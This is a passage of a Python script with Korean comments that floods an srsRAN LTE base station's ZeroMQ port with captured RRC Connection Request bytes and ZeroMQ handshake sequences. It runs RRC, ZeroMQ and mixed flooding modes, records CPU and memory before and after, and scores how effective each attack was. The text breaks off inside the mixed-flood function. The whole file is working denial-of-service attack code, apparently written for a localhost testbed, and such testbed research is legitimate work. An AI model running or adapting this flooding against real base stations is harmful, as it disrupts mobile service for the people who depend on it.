#!/usr/bin/env python3
"""
실제 UE 메시지를 사용한 공격
캡처된 실제 UE 메시지를 그대로 사용
"""

import zmq
import struct
import time
import random
import threading
import subprocess
import os
import json
from datetime import datetime

class RealUEAttack:
    def __init__(self, target_port=2001):
        self.target_port = target_port
        self.context = zmq.Context()
        self.running = False
        
        # 로그 디렉토리 설정
        self.log_dir = "logs"
        if not os.path.exists(self.log_dir):
            os.makedirs(self.log_dir)
        
        # 리소스 모니터링 변수
        self.start_stats = None
        self.end_stats = None
        self.start_time = None
        self.end_time = None
        
        # 실제 캡처된 UE 메시지들
        self.real_messages = [
            # ZeroMQ 헤더
            bytes.fromhex("ff00000000000000017f"),
            # ZeroMQ 메시지 타입
            bytes.fromhex("03"),
            # 실제 RRC Connection Request
            bytes.fromhex("01000001ff"),
            # ZeroMQ 소켓 설정
            bytes.fromhex("04260552454144590b536f636b65742d5479706500000003524551084964656e7469747900000000"),
        ]
    
    def get_system_stats(self):
        """시스템 리소스 통계 수집"""
        try:
            stats = {
                'timestamp': datetime.now().isoformat(),
                'cpu_percent': 0,
                'memory_percent': 0,
                'memory_used_gb': 0,
                'bytes_sent': 0,
                'bytes_recv': 0,
                'srsran_cpu': 0,
                'srsran_memory': 0
            }

            # CPU 사용량 (top 명령어 사용)
            try:
                result = subprocess.run(['top', '-l', '1', '-n', '0'],
                                      capture_output=True, text=True, timeout=5)
                cpu_line = [line for line in result.stdout.split('\n') if 'CPU usage' in line]
                if cpu_line:
                    import re
                    cpu_match = re.search(r'(\d+\.\d+)%', cpu_line[0])
                    if cpu_match:
                        stats['cpu_percent'] = float(cpu_match.group(1))
            except:
                pass

            # 메모리 사용량 (vm_stat 명령어 사용)
            try:
                result = subprocess.run(['vm_stat'], capture_output=True, text=True, timeout=5)
                lines = result.stdout.split('\n')
                page_size = 4096  # 기본 페이지 크기
                total_pages = 0
                free_pages = 0

                for line in lines:
                    if 'Pages free' in line:
                        import re
                        match = re.search(r'(\d+)', line)
                        if match:
                            free_pages = int(match.group(1))
                    elif 'Pages active' in line or 'Pages inactive' in line or 'Pages wired down' in line:
                        match = re.search(r'(\d+)', line)
                        if match:
                            total_pages += int(match.group(1))

                total_pages += free_pages
                if total_pages > 0:
                    memory_used_bytes = (total_pages - free_pages) * page_size
                    memory_total_bytes = total_pages * page_size
                    stats['memory_percent'] = (memory_used_bytes / memory_total_bytes) * 100
                    stats['memory_used_gb'] = memory_used_bytes / (1024**3)
            except:
                pass

            # 네트워크 트래픽 (netstat 명령어 사용)
            try:
                result = subprocess.run(['netstat', '-ib'], capture_output=True, text=True, timeout=5)
                lines = result.stdout.split('\n')
                bytes_sent = 0
                bytes_recv = 0

                for line in lines:
                    if 'en0' in line or 'en1' in line:  # 이더넷 인터페이스
                        parts = line.split()
                        if len(parts) >= 10:
                            try:
                                bytes_sent += int(parts[6])  # obytes
                                bytes_recv += int(parts[9])  # ibytes
                            except:
                                pass

                stats['bytes_sent'] = bytes_sent
                stats['bytes_recv'] = bytes_recv
            except:
                pass

            # srsRAN 프로세스 리소스 (ps 명령어 사용)
            try:
                result = subprocess.run(['ps', 'aux'], capture_output=True, text=True, timeout=5)
                lines = result.stdout.split('\n')

                for line in lines:
                    if 'srsenb' in line.lower():
                        parts = line.split()
                        if len(parts) >= 11:
                            try:
                                cpu = float(parts[2])  # CPU 사용률
                                memory = float(parts[3])  # 메모리 사용률
                                stats['srsran_cpu'] += cpu
                                stats['srsran_memory'] += memory
                            except:
                                pass
            except:
                pass

            return stats

        except Exception as e:
            print(f"리소스 통계 수집 오류: {e}")
            return None
    
    def log_message(self, message):
        """로그 메시지 출력 및 저장"""
        timestamp = datetime.now().strftime('%H:%M:%S')
        log_msg = f"[{timestamp}] {message}"
        print(log_msg)
        
        # 로그 파일에 저장
        if hasattr(self, 'log_file') and self.log_file:
            with open(self.log_file, 'a', encoding='utf-8') as f:
                f.write(log_msg + '\n')
    
    def setup_logging(self, attack_type, duration):
        """로깅 설정"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        log_filename = f"{self.log_dir}/real_ue_attack_{attack_type}_{timestamp}.log"
        self.log_file = log_filename
        
        self.log_message("=" * 50)
        self.log_message(f"=== 실제 UE 메시지 공격 로그 시작 ===")
        self.log_message(f"공격 유형: {attack_type}")
        self.log_message(f"지속 시간: {duration}초")
        self.log_message(f"로그 파일: {log_filename}")
        self.log_message("=" * 50)
        
    def send_real_message(self, message, message_type="Unknown"):
        """실제 UE 메시지 전송"""
        try:
            socket = self.context.socket(zmq.PUSH)
            socket.connect(f"tcp://localhost:{self.target_port}")
            
            socket.send(message, zmq.NOBLOCK)
            socket.close()
            
            print(f"[{datetime.now().strftime('%H:%M:%S')}] {message_type} 전송")
            print(f"  메시지 크기: {len(message)} bytes")
            print(f"  데이터: {message.hex()}")
            return True
            
        except Exception as e:
            print(f"[{datetime.now().strftime('%H:%M:%S')}] {message_type} 전송 실패: {e}")
            return False
    
    def send_zeromq_sequence(self):
        """실제 UE의 ZeroMQ 연결 시퀀스 전송"""
        print(f"=== 실제 UE ZeroMQ 연결 시퀀스 전송 ===")
        
        # 1. ZeroMQ 헤더
        self.send_real_message(self.real_messages[0], "ZeroMQ 헤더")
        time.sleep(0.01)
        
        # 2. ZeroMQ 메시지 타입
        self.send_real_message(self.real_messages[1], "ZeroMQ 메시지 타입")
        time.sleep(0.01)
        
        # 3. 실제 RRC Connection Request
        self.send_real_message(self.real_messages[2], "RRC Connection Request")
        time.sleep(0.01)
        
        # 4. ZeroMQ 소켓 설정
        self.send_real_message(self.real_messages[3], "ZeroMQ 소켓 설정")
        time.sleep(0.01)
    
    def rrc_connection_flood(self, duration=60):
        """RRC Connection Request 플러딩 (실제 UE 메시지 사용)"""
        self.setup_logging("rrc_connection", duration)
        
        # 공격 시작 전 리소스 상태 캡처
        self.log_message("공격 시작 전 리소스 상태 캡처 중...")
        self.start_stats = self.get_system_stats()
        self.start_time = datetime.now()
        
        if self.start_stats:
            self.log_message(f"시작 CPU: {self.start_stats['cpu_percent']:.1f}%")
            self.log_message(f"시작 메모리: {self.start_stats['memory_percent']:.1f}% ({self.start_stats['memory_used_gb']:.2f}GB)")
            self.log_message(f"시작 네트워크 송신: {self.start_stats['bytes_sent']:,} bytes")
            self.log_message(f"시작 네트워크 수신: {self.start_stats['bytes_recv']:,} bytes")
            self.log_message(f"시작 srsRAN CPU: {self.start_stats['srsran_cpu']:.1f}%")
            self.log_message(f"시작 srsRAN 메모리: {self.start_stats['srsran_memory']:.1f}%")
        
        self.log_message("=" * 50)
        self.log_message(f"=== 실제 UE RRC Connection Request 플러딩 시작 ===")
        self.log_message(f"대상 포트: {self.target_port}")
        self.log_message(f"지속 시간: {duration}초")
        self.log_message("=" * 50)
        
        self.running = True
        start_time = time.time()
        count = 0
        
        while self.running and (time.time() - start_time) < duration:
            # 실제 RRC Connection Request 메시지 사용
            message = self.real_messages[2]  # 01000001ff
            
            if self.send_real_message(message, f"RRC Connection Request #{count+1}"):
                count += 1
            
            time.sleep(0.1)  # 100ms 간격
        
        # 공격 종료 후 리소스 상태 캡처
        self.log_message("=" * 50)
        self.log_message("공격 종료 후 리소스 상태 캡처 중...")
        self.end_stats = self.get_system_stats()
        self.end_time = datetime.now()
        
        if self.end_stats:
            self.log_message(f"종료 CPU: {self.end_stats['cpu_percent']:.1f}%")
            self.log_message(f"종료 메모리: {self.end_stats['memory_percent']:.1f}% ({self.end_stats['memory_used_gb']:.2f}GB)")
            self.log_message(f"종료 네트워크 송신: {self.end_stats['bytes_sent']:,} bytes")
            self.log_message(f"종료 네트워크 수신: {self.end_stats['bytes_recv']:,} bytes")
            self.log_message(f"종료 srsRAN CPU: {self.end_stats['srsran_cpu']:.1f}%")
            self.log_message(f"종료 srsRAN 메모리: {self.end_stats['srsran_memory']:.1f}%")
        
        # 리소스 변화량 계산 및 출력
        if self.start_stats and self.end_stats:
            self.log_message("=" * 50)
            self.log_message("=== 리소스 변화량 분석 ===")
            
            cpu_change = self.end_stats['cpu_percent'] - self.start_stats['cpu_percent']
            memory_change = self.end_stats['memory_percent'] - self.start_stats['memory_percent']
            memory_gb_change = self.end_stats['memory_used_gb'] - self.start_stats['memory_used_gb']
            bytes_sent_change = self.end_stats['bytes_sent'] - self.start_stats['bytes_sent']
            bytes_recv_change = self.end_stats['bytes_recv'] - self.start_stats['bytes_recv']
            srsran_cpu_change = self.end_stats['srsran_cpu'] - self.start_stats['srsran_cpu']
            srsran_memory_change = self.end_stats['srsran_memory'] - self.start_stats['srsran_memory']
            
            self.log_message(f"CPU 변화: {cpu_change:+.1f}%")
            self.log_message(f"메모리 변화: {memory_change:+.1f}% ({memory_gb_change:+.2f}GB)")
            self.log_message(f"네트워크 송신 변화: {bytes_sent_change:+,} bytes")
            self.log_message(f"네트워크 수신 변화: {bytes_recv_change:+,} bytes")
            self.log_message(f"srsRAN CPU 변화: {srsran_cpu_change:+.1f}%")
            self.log_message(f"srsRAN 메모리 변화: {srsran_memory_change:+.1f}%")
            
            # 공격 효과 분석
            self.log_message("=" * 50)
            self.log_message("=== 공격 효과 분석 ===")
            if abs(cpu_change) > 5:
                self.log_message(f"✓ CPU 사용량이 {'증가' if cpu_change > 0 else '감소'}했습니다 ({cpu_change:+.1f}%)")
            else:
                self.log_message(f"✗ CPU 사용량 변화가 미미합니다 ({cpu_change:+.1f}%)")
            
            if abs(memory_change) > 2:
                self.log_message(f"✓ 메모리 사용량이 {'증가' if memory_change > 0 else '감소'}했습니다 ({memory_change:+.1f}%)")
            else:
                self.log_message(f"✗ 메모리 사용량 변화가 미미합니다 ({memory_change:+.1f}%)")
            
            if abs(srsran_cpu_change) > 5:
                self.log_message(f"✓ srsRAN CPU 사용량이 {'증가' if srsran_cpu_change > 0 else '감소'}했습니다 ({srsran_cpu_change:+.1f}%)")
            else:
                self.log_message(f"✗ srsRAN CPU 사용량 변화가 미미합니다 ({srsran_cpu_change:+.1f}%)")
            
            if abs(srsran_memory_change) > 2:
                self.log_message(f"✓ srsRAN 메모리 사용량이 {'증가' if srsran_memory_change > 0 else '감소'}했습니다 ({srsran_memory_change:+.1f}%)")
            else:
                self.log_message(f"✗ srsRAN 메모리 사용량 변화가 미미합니다 ({srsran_memory_change:+.1f}%)")
        
        # 결과를 JSON 파일로 저장
        self.save_attack_results(count, duration)
        
        self.log_message("=" * 50)
        self.log_message(f"=== 플러딩 완료 ===")
        self.log_message(f"총 {count}개 메시지 전송")
        self.log_message(f"공격 시간: {(self.end_time - self.start_time).total_seconds():.1f}초")
        self.log_message("=" * 50)
    
    def save_attack_results(self, message_count, duration):
        """공격 결과를 JSON 파일로 저장"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        results_file = f"{self.log_dir}/real_ue_attack_results_{timestamp}.json"
        
        results = {
            'attack_info': {
                'type': 'rrc_connection',
                'duration': duration,
                'message_count': message_count,
                'target_port': self.target_port,
                'start_time': self.start_time.isoformat() if self.start_time else None,
                'end_time': self.end_time.isoformat() if self.end_time else None
            },
            'start_stats': self.start_stats,
            'end_stats': self.end_stats,
            'real_messages_used': [
                msg.hex() for msg in self.real_messages
            ]
        }
        
        with open(results_file, 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
        
        self.log_message(f"공격 결과 저장: {results_file}")
    
    def run_all_attacks(self, duration=60):
        """모든 공격 유형을 순차적으로 실행하고 결과 비교"""
        self.setup_logging("all_attacks", duration)
        
        # 전체 공격 결과 저장용
        all_results = {
            'total_start_stats': None,
            'total_end_stats': None,
            'attack_results': {},
            'comparison': {}
        }
        
        self.log_message("=" * 60)
        self.log_message("=== 모든 공격 유형 순차 실행 시작 ===")
        self.log_message(f"각 공격 지속 시간: {duration}초")
        self.log_message("=" * 60)
        
        # 전체 시작 리소스 상태 캡처
        self.log_message("전체 공격 시작 전 리소스 상태 캡처 중...")
        all_results['total_start_stats'] = self.get_system_stats()
        total_start_time = datetime.now()
        
        if all_results['total_start_stats']:
            self.log_message(f"전체 시작 CPU: {all_results['total_start_stats']['cpu_percent']:.1f}%")
            self.log_message(f"전체 시작 메모리: {all_results['total_start_stats']['memory_percent']:.1f}% ({all_results['total_start_stats']['memory_used_gb']:.2f}GB)")
            self.log_message(f"전체 시작 네트워크 송신: {all_results['total_start_stats']['bytes_sent']:,} bytes")
            self.log_message(f"전체 시작 네트워크 수신: {all_results['total_start_stats']['bytes_recv']:,} bytes")
            self.log_message(f"전체 시작 srsRAN CPU: {all_results['total_start_stats']['srsran_cpu']:.1f}%")
            self.log_message(f"전체 시작 srsRAN 메모리: {all_results['total_start_stats']['srsran_memory']:.1f}%")
        
        # 1. RRC Connection Request 공격
        self.log_message("\n" + "=" * 60)
        self.log_message("=== 1. RRC Connection Request 공격 시작 ===")
        self.log_message("=" * 60)
        
        rrc_start_stats = self.get_system_stats()
        rrc_start_time = datetime.now()
        
        self.running = True
        start_time = time.time()
        rrc_count = 0
        
        while self.running and (time.time() - start_time) < duration:
            message = self.real_messages[2]  # RRC Connection Request
            if self.send_real_message(message, f"RRC Connection Request #{rrc_count+1}"):
                rrc_count += 1
            time.sleep(0.1)
        
        rrc_end_stats = self.get_system_stats()
        rrc_end_time = datetime.now()
        
        all_results['attack_results']['rrc'] = {
            'start_stats': rrc_start_stats,
            'end_stats': rrc_end_stats,
            'start_time': rrc_start_time,
            'end_time': rrc_end_time,
            'message_count': rrc_count,
            'duration': duration
        }
        
        self.log_message(f"RRC 공격 완료: {rrc_count}개 메시지 전송")
        self.log_message(f"RRC 공격 시간: {(rrc_end_time - rrc_start_time).total_seconds():.1f}초")
        
        # 공격 간 휴식
        self.log_message("\n공격 간 휴식 (5초)...")
        time.sleep(5)
        
        # 2. ZeroMQ 시퀀스 공격
        self.log_message("\n" + "=" * 60)
        self.log_message("=== 2. ZeroMQ 시퀀스 공격 시작 ===")
        self.log_message("=" * 60)
        
        zmq_start_stats = self.get_system_stats()
        zmq_start_time = datetime.now()
        
        self.running = True
        start_time = time.time()
        zmq_count = 0
        
        while self.running and (time.time() - start_time) < duration:
            self.send_zeromq_sequence()
            zmq_count += 1
            time.sleep(0.5)
        
        zmq_end_stats = self.get_system_stats()
        zmq_end_time = datetime.now()
        
        all_results['attack_results']['zeromq'] = {
            'start_stats': zmq_start_stats,
            'end_stats': zmq_end_stats,
            'start_time': zmq_start_time,
            'end_time': zmq_end_time,
            'message_count': zmq_count,
            'duration': duration
        }
        
        self.log_message(f"ZeroMQ 공격 완료: {zmq_count}개 시퀀스 전송")
        self.log_message(f"ZeroMQ 공격 시간: {(zmq_end_time - zmq_start_time).total_seconds():.1f}초")
        
        # 공격 간 휴식
        self.log_message("\n공격 간 휴식 (5초)...")
        time.sleep(5)
        
        # 3. 혼합 공격
        self.log_message("\n" + "=" * 60)
        self.log_message("=== 3. 혼합 공격 시작 ===")
        self.log_message("=" * 60)
        
        mixed_start_stats = self.get_system_stats()
        mixed_start_time = datetime.now()
        
        self.running = True
        start_time = time.time()
        mixed_count = 0
        
        while self.running and (time.time() - start_time) < duration:
            if random.random() < 0.5:
                message = self.real_messages[2]  # RRC Connection Request
                self.send_real_message(message, f"RRC Connection Request #{mixed_count+1}")
            else:
                self.send_zeromq_sequence()
            mixed_count += 1
            time.sleep(0.1)
        
        mixed_end_stats = self.get_system_stats()
        mixed_end_time = datetime.now()
        
        all_results['attack_results']['mixed'] = {
            'start_stats': mixed_start_stats,
            'end_stats': mixed_end_stats,
            'start_time': mixed_start_time,
            'end_time': mixed_end_time,
            'message_count': mixed_count,
            'duration': duration
        }
        
        self.log_message(f"혼합 공격 완료: {mixed_count}개 메시지/시퀀스 전송")
        self.log_message(f"혼합 공격 시간: {(mixed_end_time - mixed_start_time).total_seconds():.1f}초")
        
        # 전체 종료 리소스 상태 캡처
        self.log_message("\n" + "=" * 60)
        self.log_message("전체 공격 종료 후 리소스 상태 캡처 중...")
        all_results['total_end_stats'] = self.get_system_stats()
        total_end_time = datetime.now()
        
        if all_results['total_end_stats']:
            self.log_message(f"전체 종료 CPU: {all_results['total_end_stats']['cpu_percent']:.1f}%")
            self.log_message(f"전체 종료 메모리: {all_results['total_end_stats']['memory_percent']:.1f}% ({all_results['total_end_stats']['memory_used_gb']:.2f}GB)")
            self.log_message(f"전체 종료 네트워크 송신: {all_results['total_end_stats']['bytes_sent']:,} bytes")
            self.log_message(f"전체 종료 네트워크 수신: {all_results['total_end_stats']['bytes_recv']:,} bytes")
            self.log_message(f"전체 종료 srsRAN CPU: {all_results['total_end_stats']['srsran_cpu']:.1f}%")
            self.log_message(f"전체 종료 srsRAN 메모리: {all_results['total_end_stats']['srsran_memory']:.1f}%")
        
        # 모든 공격 결과 비교 분석
        self.log_message("\n" + "=" * 60)
        self.log_message("=== 모든 공격 결과 비교 분석 ===")
        self.log_message("=" * 60)
        
        self.analyze_all_attack_results(all_results)
        
        # 전체 결과를 JSON 파일로 저장
        self.save_all_attack_results(all_results, total_start_time, total_end_time)
        
        self.log_message("\n" + "=" * 60)
        self.log_message("=== 모든 공격 완료 ===")
        self.log_message(f"총 공격 시간: {(total_end_time - total_start_time).total_seconds():.1f}초")
        self.log_message(f"RRC 메시지: {rrc_count}개")
        self.log_message(f"ZeroMQ 시퀀스: {zmq_count}개")
        self.log_message(f"혼합 메시지: {mixed_count}개")
        self.log_message("=" * 60)
    
    def analyze_all_attack_results(self, all_results):
        """모든 공격 결과 비교 분석"""
        attack_names = {
            'rrc': 'RRC Connection Request',
            'zeromq': 'ZeroMQ 시퀀스',
            'mixed': '혼합 공격'
        }
        
        # 각 공격별 효과 분석
        for attack_type, attack_name in attack_names.items():
            if attack_type in all_results['attack_results']:
                result = all_results['attack_results'][attack_type]
                start_stats = result['start_stats']
                end_stats = result['end_stats']
                
                if start_stats and end_stats:
                    self.log_message(f"\n--- {attack_name} 공격 효과 ---")
                    
                    cpu_change = end_stats['cpu_percent'] - start_stats['cpu_percent']
                    memory_change = end_stats['memory_percent'] - start_stats['memory_percent']
                    srsran_cpu_change = end_stats['srsran_cpu'] - start_stats['srsran_cpu']
                    srsran_memory_change = end_stats['srsran_memory'] - start_stats['srsran_memory']
                    
                    self.log_message(f"CPU 변화: {cpu_change:+.1f}%")
                    self.log_message(f"메모리 변화: {memory_change:+.1f}%")
                    self.log_message(f"srsRAN CPU 변화: {srsran_cpu_change:+.1f}%")
                    self.log_message(f"srsRAN 메모리 변화: {srsran_memory_change:+.1f}%")
                    
                    # 효과 평가
                    effectiveness = 0
                    if abs(cpu_change) > 5:
                        effectiveness += 1
                        self.log_message(f"✓ CPU 효과: {'증가' if cpu_change > 0 else '감소'} ({cpu_change:+.1f}%)")
                    if abs(memory_change) > 2:
                        effectiveness += 1
                        self.log_message(f"✓ 메모리 효과: {'증가' if memory_change > 0 else '감소'} ({memory_change:+.1f}%)")
                    if abs(srsran_cpu_change) > 5:
                        effectiveness += 1
                        self.log_message(f"✓ srsRAN CPU 효과: {'증가' if srsran_cpu_change > 0 else '감소'} ({srsran_cpu_change:+.1f}%)")
                    if abs(srsran_memory_change) > 2:
                        effectiveness += 1
                        self.log_message(f"✓ srsRAN 메모리 효과: {'증가' if srsran_memory_change > 0 else '감소'} ({srsran_memory_change:+.1f}%)")
                    
                    if effectiveness == 0:
                        self.log_message("✗ 공격 효과가 미미합니다")
                    elif effectiveness <= 2:
                        self.log_message(f"△ 공격 효과가 보통입니다 ({effectiveness}/4)")
                    else:
                        self.log_message(f"✓ 공격 효과가 큽니다 ({effectiveness}/4)")
        
        # 전체 효과 비교
        self.log_message(f"\n--- 전체 공격 효과 비교 ---")
        if all_results['total_start_stats'] and all_results['total_end_stats']:
            total_cpu_change = all_results['total_end_stats']['cpu_percent'] - all_results['total_start_stats']['cpu_percent']
            total_memory_change = all_results['total_end_stats']['memory_percent'] - all_results['total_start_stats']['memory_percent']
            total_srsran_cpu_change = all_results['total_end_stats']['srsran_cpu'] - all_results['total_start_stats']['srsran_cpu']
            total_srsran_memory_change = all_results['total_end_stats']['srsran_memory'] - all_results['total_start_stats']['srsran_memory']
            
            self.log_message(f"전체 CPU 변화: {total_cpu_change:+.1f}%")
            self.log_message(f"전체 메모리 변화: {total_memory_change:+.1f}%")
            self.log_message(f"전체 srsRAN CPU 변화: {total_srsran_cpu_change:+.1f}%")
            self.log_message(f"전체 srsRAN 메모리 변화: {total_srsran_memory_change:+.1f}%")
    
    def save_all_attack_results(self, all_results, total_start_time, total_end_time):
        """모든 공격 결과를 JSON 파일로 저장"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        results_file = f"{self.log_dir}/all_attacks_results_{timestamp}.json"
        
        results = {
            'attack_info': {
                'type': 'all_attacks',
                'total_duration': (total_end_time - total_start_time).total_seconds(),
                'start_time': total_start_time.isoformat(),
                'end_time': total_end_time.isoformat(),
                'target_port': self.target_port
            },
            'total_start_stats': all_results['total_start_stats'],
            'total_end_stats': all_results['total_end_stats'],
            'attack_results': all_results['attack_results'],
            'real_messages_used': [
                msg.hex() for msg in self.real_messages
            ]
        }
        
        with open(results_file, 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
        
        self.log_message(f"전체 공격 결과 저장: {results_file}")
    
    def zeromq_sequence_flood(self, duration=60):
        """ZeroMQ 연결 시퀀스 플러딩"""
        self.setup_logging("zeromq_sequence", duration)
        
        # 공격 시작 전 리소스 상태 캡처
        self.log_message("공격 시작 전 리소스 상태 캡처 중...")
        self.start_stats = self.get_system_stats()
        self.start_time = datetime.now()
        
        if self.start_stats:
            self.log_message(f"시작 CPU: {self.start_stats['cpu_percent']:.1f}%")
            self.log_message(f"시작 메모리: {self.start_stats['memory_percent']:.1f}% ({self.start_stats['memory_used_gb']:.2f}GB)")
            self.log_message(f"시작 네트워크 송신: {self.start_stats['bytes_sent']:,} bytes")
            self.log_message(f"시작 네트워크 수신: {self.start_stats['bytes_recv']:,} bytes")
            self.log_message(f"시작 srsRAN CPU: {self.start_stats['srsran_cpu']:.1f}%")
            self.log_message(f"시작 srsRAN 메모리: {self.start_stats['srsran_memory']:.1f}%")
        
        self.log_message("=" * 50)
        self.log_message(f"=== ZeroMQ 연결 시퀀스 플러딩 시작 ===")
        self.log_message(f"대상 포트: {self.target_port}")
        self.log_message(f"지속 시간: {duration}초")
        self.log_message("=" * 50)
        
        self.running = True
        start_time = time.time()
        count = 0
        
        while self.running and (time.time() - start_time) < duration:
            self.send_zeromq_sequence()
            count += 1
            time.sleep(0.5)  # 500ms 간격
        
        # 공격 종료 후 리소스 상태 캡처
        self.log_message("=" * 50)
        self.log_message("공격 종료 후 리소스 상태 캡처 중...")
        self.end_stats = self.get_system_stats()
        self.end_time = datetime.now()
        
        if self.end_stats:
            self.log_message(f"종료 CPU: {self.end_stats['cpu_percent']:.1f}%")
            self.log_message(f"종료 메모리: {self.end_stats['memory_percent']:.1f}% ({self.end_stats['memory_used_gb']:.2f}GB)")
            self.log_message(f"종료 네트워크 송신: {self.end_stats['bytes_sent']:,} bytes")
            self.log_message(f"종료 네트워크 수신: {self.end_stats['bytes_recv']:,} bytes")
            self.log_message(f"종료 srsRAN CPU: {self.end_stats['srsran_cpu']:.1f}%")
            self.log_message(f"종료 srsRAN 메모리: {self.end_stats['srsran_memory']:.1f}%")
        
        # 리소스 변화량 계산 및 출력
        if self.start_stats and self.end_stats:
            self.log_message("=" * 50)
            self.log_message("=== 리소스 변화량 분석 ===")
            
            cpu_change = self.end_stats['cpu_percent'] - self.start_stats['cpu_percent']
            memory_change = self.end_stats['memory_percent'] - self.start_stats['memory_percent']
            memory_gb_change = self.end_stats['memory_used_gb'] - self.start_stats['memory_used_gb']
            bytes_sent_change = self.end_stats['bytes_sent'] - self.start_stats['bytes_sent']
            bytes_recv_change = self.end_stats['bytes_recv'] - self.start_stats['bytes_recv']
            srsran_cpu_change = self.end_stats['srsran_cpu'] - self.start_stats['srsran_cpu']
            srsran_memory_change = self.end_stats['srsran_memory'] - self.start_stats['srsran_memory']
            
            self.log_message(f"CPU 변화: {cpu_change:+.1f}%")
            self.log_message(f"메모리 변화: {memory_change:+.1f}% ({memory_gb_change:+.2f}GB)")
            self.log_message(f"네트워크 송신 변화: {bytes_sent_change:+,} bytes")
            self.log_message(f"네트워크 수신 변화: {bytes_recv_change:+,} bytes")
            self.log_message(f"srsRAN CPU 변화: {srsran_cpu_change:+.1f}%")
            self.log_message(f"srsRAN 메모리 변화: {srsran_memory_change:+.1f}%")
            
            # 공격 효과 분석
            self.log_message("=" * 50)
            self.log_message("=== 공격 효과 분석 ===")
            if abs(cpu_change) > 5:
                self.log_message(f"✓ CPU 사용량이 {'증가' if cpu_change > 0 else '감소'}했습니다 ({cpu_change:+.1f}%)")
            else:
                self.log_message(f"✗ CPU 사용량 변화가 미미합니다 ({cpu_change:+.1f}%)")
            
            if abs(memory_change) > 2:
                self.log_message(f"✓ 메모리 사용량이 {'증가' if memory_change > 0 else '감소'}했습니다 ({memory_change:+.1f}%)")
            else:
                self.log_message(f"✗ 메모리 사용량 변화가 미미합니다 ({memory_change:+.1f}%)")
            
            if abs(srsran_cpu_change) > 5:
                self.log_message(f"✓ srsRAN CPU 사용량이 {'증가' if srsran_cpu_change > 0 else '감소'}했습니다 ({srsran_cpu_change:+.1f}%)")
            else:
                self.log_message(f"✗ srsRAN CPU 사용량 변화가 미미합니다 ({srsran_cpu_change:+.1f}%)")
            
            if abs(srsran_memory_change) > 2:
                self.log_message(f"✓ srsRAN 메모리 사용량이 {'증가' if srsran_memory_change > 0 else '감소'}했습니다 ({srsran_memory_change:+.1f}%)")
            else:
                self.log_message(f"✗ srsRAN 메모리 사용량 변화가 미미합니다 ({srsran_memory_change:+.1f}%)")
        
        # 결과를 JSON 파일로 저장
        self.save_attack_results(count, duration)
        
        self.log_message("=" * 50)
        self.log_message(f"=== 플러딩 완료 ===")
        self.log_message(f"총 {count}개 시퀀스 전송")
        self.log_message(f"공격 시간: {(self.end_time - self.start_time).total_seconds():.1f}초")
        self.log_message("=" * 50)
    
    def mixed_flood(self, duration=60):
        """혼합 플러딩 (RRC + ZeroMQ 시퀀스)"""
        self.setup_logging("mixed", duration)
        
        # 공격 시작 전 리소스 상태 캡처
        self.log_message("공격 시작 전 리소스 상태 캡처 중...")
        self.start_stats = self.get_system_stats()
        self.start_time = datetime.now()
        
        if self.start_stats:
            self.log_message(f"시작 CPU: {self.start_stats['cpu_percent']:.1f}%")
            self.log_message(f"시작 메모리: {self.start_stats['memory_percent']:.1f}% ({self.start_stats['memory_used_gb']:.2f}GB)")
            self.log_message(f"시작 네트워크 송신: {self.start_stats['bytes_sent']:,} bytes")
            self.log_message(f"시작 네트워크 수신: {self.start_stats['bytes_recv']:,} bytes")
            self.log_message(f"시작 srsRAN CPU: {self.start_stats['srsran_cpu']:.1f}%")
            self.log_message(f"시작 srsRAN 메모리: {self.start_stats['srsran_memory']:.1f}%")
        
        self.log_message("=" * 50)
        self.log_message(f"=== 혼합 플러딩 (RRC + ZeroMQ) 시작 ===")
        self.log_message(f"대상 포트: {self.target_port}")
        self.log_message(f"지속 시간: {duration}초")
        self.log_message("=" * 50)
        
        self.running = True
        start_time = time.time()
        count = 0
        
        while self.running and (time.time() - start_time) < duration:
            # 50% 확률로 RRC 메시지 또는 ZeroMQ 시퀀스
            if random.random() < 0.5:
                message = self.real_messages[2]  # RRC Connection Request
                self.send_real_message(message, f"RRC Connection Request #{count+1}")
            else:
                self.send_zeromq_sequence()
            
            count += 1
            time.sleep(0.1)  # 100ms 간격
        
        # 공격 종료 후 리소스 상태 캡처
        self.log_message("=" * 50)
        self.log_message("공격 종료 후 리소스 상태 캡처 중...")
        self.end_stats = self.get_system_stats()
        self.end_time = datetime.now()
        
        if self.end_stats:
            self.log_message(f"종료 CPU: {self.end_stats['cpu_percent']:.1f}%")
            self.log_message(f"종료 메모리: {self.end_stats['memory_percent']:.1f}% ({self.end_stats['memory_used_gb']:.2f}GB)")
            self.log_message(f"종료 네트워크 송신: {self.end_stats['bytes_sent']:,} bytes")
            self.log_message(f"종료 네트워크 수신: {self.end_stats['bytes_recv']:,} bytes")
            self.log_message(f"종료 srsRAN CPU: {self.end_stats['srsran_cpu']:.1f}%")
            self.log_message(f"종료 srsRAN 메모리: {self.end_stats['srsran_memory']:.1f}%")
        
        # 리소스 변화량 계산 및 출력
        if self.start_stats and self.end_stats:
            self.log_message("=" * 50)
            self.log_message("=== 리소스 변화량 분석 ===")
            
            cpu_change = self.end_stats['cpu_percent'] - self.start_stats['cpu_percent']
            memory_change = self.end_stats['memory_percent'] - self.start_stats['memory_percent']
            memory_gb_change = self.end_stats['memory_used_gb'] - self.start_stats['memory_used_gb']
            bytes_sent_change = self.end_stats['bytes_sent'] - self.start_stats['bytes_sent']
            bytes_recv_change = self.end_stats['bytes_recv'] - self.start_stats['bytes_recv']
            srsran_cpu_change = self.end_stats['srsran_cpu'] - self.start_stats['srsran_cpu']
            srsran_memory_change = self.end_stats['srsran_memory'] - self.start_stats['srsran_memory']
            
            self.log_message(f"CPU 변화: {cpu_change:+.1f}%")
            self.log_message(f"메모리 변화: {memory_change:+.1f}% ({memory_gb_change:+.2f}GB)")
            self.log_message(f"네트워크 송신 변화: {bytes_sent_change:+,} bytes")
            self.log_message(f"네트워크 수신 변화: {bytes_recv_change:+,} bytes")
            self.log_message(f"srsRAN CPU 변화: {srsran_cpu_change:+.1f}%")
            self.log_message(f"srsRAN 메모리 변화: {srsran_memory_change:+.1f}%")
            
            # 공격 효과 분석
            self.log_message("=" * 50)
            self.log_message("=== 공격 효과 분석 ===")
            if abs(cpu_change) > 5:
